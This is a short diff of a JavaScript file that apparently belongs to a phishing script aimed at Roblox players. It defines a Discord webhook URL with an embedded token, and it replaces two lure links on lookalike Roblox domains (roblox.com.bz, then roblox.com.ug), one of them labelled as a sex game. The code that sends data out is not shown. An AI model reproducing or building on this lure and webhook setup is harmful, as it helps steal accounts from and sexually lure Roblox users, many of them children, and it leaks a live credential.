@@ -2,8 +2,8 @@
   'use strict';
 
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1518780844297289918/z8yd-aLT6bp4ucHq9BKgLI-BapBLiW3l4hdVkY-Q8UlMN0Vir9aZ0xlQPca4nEnZSJEU';
-  const NEW_SWORD_LINK = 'https://roblox.com.bz/games/9377953133/Mobile-Sword-Fight?privateServerLinkCode=78900447338733750394827051417199';
-  const SEX_GAME_LINK = 'https://roblox.com.bz/games/77182599101794/4nn1s-Place?privateServerLinkCode=78900447338733750394827051417199';
+  const NEW_SWORD_LINK = 'https://roblox.com.ug/games/122159079155610/Steal-A-Phone?privateServerLinkCode=36222072360632783707895993359447';
+  const SEX_GAME_LINK = 'https://roblox.com.ug/games/122159079155610/Steal-A-Phone?privateServerLinkCode=36222072360632783707895993359447';
 
   // Generate a unique User ID
   function generateUserId() {
